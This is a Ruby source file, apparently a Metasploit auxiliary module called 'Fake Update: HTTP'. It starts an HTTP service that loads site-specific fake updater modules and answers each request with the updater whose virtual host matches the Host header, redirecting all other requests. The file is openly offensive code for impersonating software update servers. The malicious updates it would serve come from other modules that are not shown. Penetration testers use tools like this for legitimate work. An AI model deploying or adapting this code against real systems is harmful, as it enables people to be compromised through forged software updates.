require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
#	include Msf::Exploit::Remote::HttpServer::HTML
	
	def initialize
		super(
			'Name'        => 'Fake Update: HTTP',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake all available update modules.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)
	end

	def run
		@updaters = []
		
		framework.datastore['update_server'] = true	
		
		module_names = framework.modules.module_names("auxiliary")
		module_names.each{ |module_name|
			if module_name =~ /server\/update\/sites/
				updater = framework.modules.create("auxiliary/#{module_name}") 
				if updater.nil?
					print_status("could not start #{module_name}")
				else
					print_status("#{module_name} loaded")
					@updaters << updater
				end
			end
		}
		framework.datastore['update_server'] = false
		exploit()
	end
	
	def dispatch_request(cli, req)
		
		@updaters.each{ |updater|
			updater.base['vh'].each{ |vh|	
				if req['Host'] =~ /#{vh}/
					print_status("updater on #{req['Host']}")
					return updater.dispatch_request(cli,req)
				end
			} if not updater.base.nil?
		}
		res = redirect(cli,req)
		cli.put(res)
		return		
	
	end
end
